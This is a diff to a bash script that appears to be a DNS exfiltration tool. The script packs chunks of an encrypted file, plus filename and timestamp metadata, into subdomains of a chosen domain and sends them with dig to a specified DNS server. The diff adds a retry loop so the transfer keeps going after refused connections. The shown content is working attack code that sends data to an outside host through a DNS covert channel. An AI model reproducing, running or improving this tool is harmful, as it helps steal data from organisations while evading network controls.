@@ -34,7 +34,6 @@ if [[ -z "$FilePath" || -z "$Password" || ! -f "$FilePath" ]]; then
     exit 1
 fi
 
-
 # Get filename from FilePath
 filename=$(basename "$FilePath")
 
@@ -84,11 +83,30 @@ while [[ $chunk_id -lt $nb_chunks ]]; do
     metadata="$encrypted_filename|$timestamp|$nb_chunks"
     subdomain="$chunk_id.${chunks[0]}.${chunks[1]}.${chunks[2]}.${chunks[3]}.$metadata.$Domain"
 
-    # Send DNS query using dig
-    if [[ "$UseTcp" = true ]]; then
-        dig +tcp +short "$subdomain" @"$DnsServerIp"
-    else
-        dig +short "$subdomain" @"$DnsServerIp"
+    # Retry logic for DNS query
+    max_retries=5
+    retry_count=0
+    success=false
+
+    while [[ $retry_count -lt $max_retries && $success == false ]]; do
+        if [[ "$UseTcp" = true ]]; then
+            dig_output=$(dig +tcp +short "$subdomain" @"$DnsServerIp" 2>&1)
+        else
+            dig_output=$(dig +short "$subdomain" @"$DnsServerIp" 2>&1)
+        fi
+
+        if [[ ! "$dig_output" == *"connection refused"* ]]; then
+            success=true
+        else
+            retry_count=$((retry_count + 1))
+            echo "[*] Timeout occurred, retrying $retry_count/$max_retries..."
+            sleep 3
+        fi
+    done
+
+    if [[ $success == false ]]; then
+        echo "[!] Failed to send DNS query after multiple retries."
+        exit 1
     fi
 
     printf "%4d%%\r" $((100 * chunk_id / nb_chunks))
